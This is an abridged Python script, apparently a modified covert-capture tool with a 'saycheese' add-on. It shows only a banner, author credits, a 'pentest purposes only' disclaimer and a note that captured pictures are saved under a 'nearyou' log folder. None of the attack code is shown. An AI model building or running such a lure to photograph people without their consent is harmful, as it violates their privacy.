#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Coded by thewhiteh4t
# Edited by Samarine (TG: @samarine_w  VK: Getbot Quert)
# You can use it educational and pentest purposes only !!!
# I'm talking too much, so, let's begin...
import os
import csv
import sys
import time
...
def banner():
   ...
   _____             _           __   
  / ___/____ ___  __(_)_______  / /__ 
  \__ \/ __ `/ / / / /_  /_  / / / _ \
 ___/ / /_/ / /_/ / / / /_/ /_/ /  __/
/____/\__, /\__,_/_/ /___/___/_/\___/ 
        /_/                           
 ''' + W)
	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
	print('\n' + G + '[>]' + C + ' Edited By : ' + W + 'samarine (TG: @samarine_w)')
	print('\n' + G + '[>]' + C + ' Changes : ' + W + 'Added saycheese part')
	print('\n' + G + '[>]' + C + ' Author of saycheese : ' + W + 'thelinuxchoice')
	print('\n' + G + '[>]' + C + ' Version    : ' + W + version + '\n')
	print('\n\n' + W + '[I]' + C + ' Pictures will be in ./templates/nearyou/log' + '\n')
...
try:
	...
	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt is catched, quitting...' + W)
	Quit()
